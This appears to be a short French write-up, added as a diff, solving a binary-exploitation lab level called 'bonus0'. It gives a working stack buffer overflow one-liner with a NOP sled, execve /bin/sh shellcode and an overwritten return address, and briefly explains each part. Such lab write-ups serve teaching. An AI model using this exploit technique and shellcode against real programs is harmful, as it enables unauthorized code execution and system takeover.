@@ -1,0 +1,20 @@
+les 2 doivent faire plus de 20 chars pour buffer overflow il faut
+car le strcpy est protegé avec le read mais pas le strcpy ni le strcat
+empecher d'avoir des \0 au moment des strcpy
+
+on va devoir passer par un shellcode car il n'y a rien pour lancer un shell.
+
+on a un buffer de 4096 avec trop d'espace pour pas grand chose
+
+on va donc utiliser ca:
+(python -c 'print "A" * 20 +  "\x90"*200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"' ; python -c 'print "B"*9+"\xBF\xFF\xE6\x15"[::-1] +"C"*7' ; cat) | ./bonus0
+
+petite explication : on écrit les 20 A pour empecher le 0 d'apparaitre,
+on espace de 200 NOP pour avoir de la place ou jump, on met le shellcode
+
+ensuite on arrive dans le second parametre (argv[2])
+
+on a un offset de 9 puis on ecrit l'adresse au millieu des nop,
+et en remplis le buffer pour arriver a 20
+
+le cat sert a laisser le terminal ouvert (eviter le EOF)
